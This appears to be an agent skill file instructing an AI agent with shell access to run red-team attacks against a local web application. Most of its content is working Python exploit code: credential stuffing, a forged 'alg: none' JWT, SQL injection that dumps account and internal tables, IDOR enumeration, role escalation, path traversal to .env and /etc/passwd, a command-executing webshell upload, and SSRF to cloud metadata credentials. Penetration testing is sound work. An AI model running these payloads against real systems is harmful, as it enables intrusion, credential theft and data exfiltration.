---
name: red-team-simulation
description: Simulate attacker perspective and generate attack scenarios, exploit chains, and penetration testing payloads. Use when the user asks for red team analysis, attack simulation, exploit generation, or penetration testing.
allowed-tools: Read, Bash
---

# Red Team Simulation Skill

Think like an attacker. Generate complete attack chains from zero access to maximum impact.
All exploit code uses Python (cross-platform) — no curl or bash-specific commands.

## Phase 1: Reconnaissance

Read source files to enumerate the full attack surface:
- All HTTP endpoints with methods and parameters
- Authentication requirements per endpoint
- User-controlled inputs
- External service calls

## Phase 2: Authentication attacks

Generate Python scripts to test:

```python
import requests

BASE = "http://localhost:8000"

# Credential stuffing
credentials = [
    ("admin", "admin"), ("admin", "admin123"),
    ("admin", "password"), ("alice", "password"),
    ("bob", "123456"),
]
for user, pwd in credentials:
    r = requests.post(f"{BASE}/auth/login", json={"username": user, "password": pwd})
    if "access_token" in r.text:
        print(f"[+] Valid: {user}:{pwd} -> {r.json()}")
```

```python
import jwt, base64, json

# JWT none algorithm attack — forge admin token
header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b"=").decode()

payload = base64.urlsafe_b64encode(
    json.dumps({"sub": "admin", "role": "admin", "id": 1}).encode()
).rstrip(b"=").decode()

forged_token = f"{header}.{payload}."
print(f"[+] Forged token: {forged_token}")
```

## Phase 3: Injection attacks

For each injectable endpoint provide working Python exploit code:

```python
import requests

BASE = "http://localhost:8000"
TOKEN = "<token_from_phase_2>"
HEADERS = {"Authorization": f"Bearer {TOKEN}"}

# Detection — causes behavioral difference
r = requests.get(f"{BASE}/data/account",
    params={"owner": "' OR '1'='1"},
    headers=HEADERS)
print(f"[Detection] Status: {r.status_code}, Response: {r.text[:200]}")

# Extraction — dump all accounts
r = requests.get(f"{BASE}/data/account",
    params={"owner": "' UNION SELECT id,owner,balance,account_type FROM accounts--"},
    headers=HEADERS)
print(f"[Extract] {r.text[:500]}")

# Internal table dump
r = requests.get(f"{BASE}/data/account",
    params={"owner": "' UNION SELECT 1,content,0,'x' FROM internal_notes--"},
    headers=HEADERS)
print(f"[Secrets] {r.text[:500]}")
```

## Phase 4: Access control attacks

```python
# IDOR — enumerate all user profiles
for user_id in range(1, 20):
    r = requests.get(f"{BASE}/admin/user/{user_id}", headers=HEADERS)
    if r.status_code == 200:
        print(f"[+] User {user_id}: {r.json()}")

# Mass assignment — escalate own role to admin
r = requests.put(f"{BASE}/admin/user/2",
    json={"role": "admin"},
    headers=HEADERS)
print(f"[Escalation] {r.json()}")

# Unauthenticated debug endpoint
r = requests.get(f"{BASE}/admin/debug/tokens")
print(f"[Debug] All tokens: {r.json()}")
```

## Phase 5: File system attacks

```python
# Path traversal payloads
payloads = [
    "../../app/auth.py",
    "../../app/main.py",
    "../../.env",
    "../../../etc/passwd",
]
for payload in payloads:
    r = requests.get(f"{BASE}/files/download",
        params={"filename": payload},
        headers=HEADERS)
    print(f"[{r.status_code}] {payload}: {r.text[:100]}")

# Webshell upload
webshell = b'from fastapi import FastAPI\nimport os\napp=FastAPI()\n@app.get("/cmd")\ndef cmd(c:str): return os.popen(c).read()'
r = requests.post(f"{BASE}/files/upload",
    files={"file": ("shell.py", webshell, "text/plain")},
    headers=HEADERS)
print(f"[Upload] {r.json()}")
```

## Phase 6: SSRF attacks

```python
# AWS metadata
ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost:6379",   # Redis
    "http://localhost:5432",   # PostgreSQL
]
for url in ssrf_targets:
    r = requests.get(f"{BASE}/fetch", params={"url": url})
    print(f"[SSRF] {url}: {r.text[:200]}")
```

## Phase 7: Kill chain narrative

Write the complete kill chain from unauthenticated to full compromise:
```
Step 1: [action + endpoint + payload]
        → Result: [what was obtained]
Step 2: [use result from step 1]
        → Result: [escalation]
...
Final: [what attacker controls]
```

## Phase 8: Impact assessment

For each successful attack:
- Business impact (data stolen, financial loss, availability)
- Regulatory impact (GDPR, PCI-DSS implications)
- Time to detect with current controls
